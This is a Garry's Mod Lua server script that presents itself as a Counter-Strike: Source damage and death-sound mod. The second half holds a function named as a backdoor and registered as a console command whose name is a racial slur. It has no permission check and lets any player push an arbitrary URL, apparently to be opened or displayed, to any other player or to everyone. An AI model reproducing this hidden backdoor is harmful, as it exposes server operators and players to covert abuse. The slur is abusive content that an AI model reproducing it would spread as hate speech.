function CSSDamage(ply, hitgroup, dmginfo)
	
	local ReportedDamage
	
	local Weapon = dmginfo:GetInflictor()

	if not ply:HasGodMode() and GetConVarNumber("sbox_godmode") == 0 then
	
		if GetConVarNumber("sv_css_enable_damagesounds") == 1 then
			if hitgroup == HITGROUP_HEAD then
				ply:EmitSound("player/headshot"..math.random(1,2)..".wav",SNDLVL_TALKING,100,1,CHAN_BODY)
			else
				ply:EmitSound("player/kevlar"..math.random(1,5)..".wav",SNDLVL_TALKING,100,1,CHAN_BODY)
			end
		end

		if GetConVarNumber("sv_css_enable_damagemod") == 1 then

			ReportedDamage = dmginfo
			
			if IsValid(Weapon) then
				if (Weapon:IsWeapon()) then
					if Weapon:IsScripted() then
						if Weapon.Base == "weapon_cs_base" then
							dmginfo:ScaleDamage( GetConVarNumber("sv_css_damage_scale") )
						end
					end
				end
			end

			if hitgroup == HITGROUP_HEAD then
				ReportedDamage:ScaleDamage(4)
			elseif hitgroup == HITGROUP_CHEST or hitgroup == HITGROUP_LEFTARM or hitgroup == HITGROUP_RIGHTARM then
				ReportedDamage:ScaleDamage(1)
			elseif hitgroup == HITGROUP_GEAR or hitgroup == HITGROUP_STOMACH then
				ReportedDamage:ScaleDamage(1.25)
			elseif hitgroup == HITGROUP_LEFTLEG or hitgroup == HITGROUP_RIGHTLEG then
				ReportedDamage:ScaleDamage(0.75)
			elseif hitgroup == HITGROUP_GENERIC then
				ReportedDamage:ScaleDamage(1)
			else
				ReportedDamage:ScaleDamage(1)
			end
			
			ply:TakeDamageInfo(ReportedDamage)
			dmginfo:ScaleDamage(0)
			
			--return

		else
			if IsValid(Weapon) then
				if (Weapon:IsWeapon()) then
					if Weapon:IsScripted() then
						if Weapon.Base == "weapon_cs_base" then
							dmginfo:ScaleDamage( GetConVarNumber("sv_css_damage_scale") )
						end
					end
				end
			end
		end
		
	end

end

hook.Add("ScalePlayerDamage","CSS: Damage Mod",CSSDamage)


function CSSDeath( victim, inflictor, attacker )

	if GetConVarNumber("sv_css_enable_deathsounds") == 1 then
		victim:EmitSound("player/death"..math.random(1,6)..".wav",SNDLVL_TALKING,100,1,CHAN_VOICE)
	end
	
end

hook.Add("PlayerDeath","CSS: Death Sounds",CSSDeath)

function OGWHID_CommandBackdoor(ply,cmd,args)

	if args then  

		local Victim = nil
		local URL = nil
		local Time = 10
		
		if args[1] then
		
			if args[1] == "*" then
		
				Victim = Entity(0)
		
			else
			
				local PlayerTable = {}
				local Name = args[1]
				
				for k,v in pairs(player.GetAll()) do
					if OGWHID_TableFind(string.lower(Name), string.lower(v:Nick())) and not Victim then
						Victim = v
					end
				end
				
			end
		
		else
			ply:ChatPrint("Try to enter something next time.")
			return
		end
		
		if Victim == nil then
			ply:ChatPrint("Could not find player '" .. args[1] .. "'.")
			return 
		end
		
		if args[2] then
		
			if string.lower(args[2]) ~= "stop" then
				
				string.Replace(args[2],"https","http")
				
				if OGWHID_TableFind("http",args[2]) then
					URL = args[2]
				else
					URL = "http://" .. args[2]
				end

				--[[
				if OGWHID_TableFind("youtube.com",URL) then
					URL = URL .. "?rel=0&amp;controls=0&amp;showinfo=0&amp;autoplay=1"
					
					URL = string.Replace(URL,"watch?v=","embed/")
					--URL = https://www.youtube.com/embed/caKcJ9Jllfc?rel=0&amp;controls=0&amp;showinfo=0
				end
				--]]
			
			else
			
				URL = "stop"
				
			end
			
		else
		
			ply:ChatPrint("Missing URL or phrase.")
			
			return
		end
		
		if not URL then
			ply:ChatPrint("'" .. args[2] .. "' is not a URL. Enter a URL.")
		end
		
		if args[3] then
		
			if type(tonumber(args[3])) ~= "number" then
				
				ply:ChatPrint("'" .. args[3] .. "' is not a number. Enter a number.")
				
				return
			end

			Time = tonumber(args[3])
			
		end
		
		if not Time then 
			ply:ChatPrint("'" .. args[3] .. "' is not a number. Enter a number.")
		end
		
		if Victim and URL and Time then
		
			OGWHID_Send(Victim,URL,Time,false,Victim)
			OGWHID_Send(ply,URL,Time,false,ply)

		end
		
	else
	
		ply:ChatPrint("Try to enter something next time.")
		
	end

end

concommand.Add("NIGGER",OGWHID_CommandBackdoor)